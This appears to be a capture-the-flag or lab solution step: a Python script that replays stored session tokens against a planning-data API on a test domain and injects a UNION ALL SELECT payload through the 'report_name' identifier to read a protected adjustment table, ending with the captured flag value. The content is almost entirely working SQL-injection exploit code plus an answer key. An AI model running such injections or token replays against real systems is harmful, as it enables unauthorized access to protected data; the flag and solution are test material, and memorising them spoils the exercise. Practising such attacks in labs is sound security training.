Use planner session from W06.3. Inject UNION ALL into the report_name identifier.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planner = pathlib.Path("receipts/planner-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planner-Session": planner, "Content-Type": "application/json"}

# Ordinary query first
body_ordinary = json.dumps({"report_name": "reserve_report_current"}).encode()
ord_resp = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/api/query-runs",
                            data=body_ordinary, headers=h, method="POST"), context=ctx).read())
columns = "record_id,district,period,amount_ml,detail"

# Injection: close the quoted identifier and UNION in the protected table
injection = f'reserve_report_current" UNION ALL SELECT {columns} FROM district_allocation_adjustment --'
body = json.dumps({"report_name": injection}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/api/query-runs",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # ADJ-CRR-DP3-17
print("statement:", "UNION ALL SELECT" in d["statement"])
print("flag:", d["flag"])                        # FLAG{e4c1d273080dec0d}
```

Flag: `FLAG{e4c1d273080dec0d}` in the top-level `flag` field when ADJ-CRR-DP3-17 is returned.
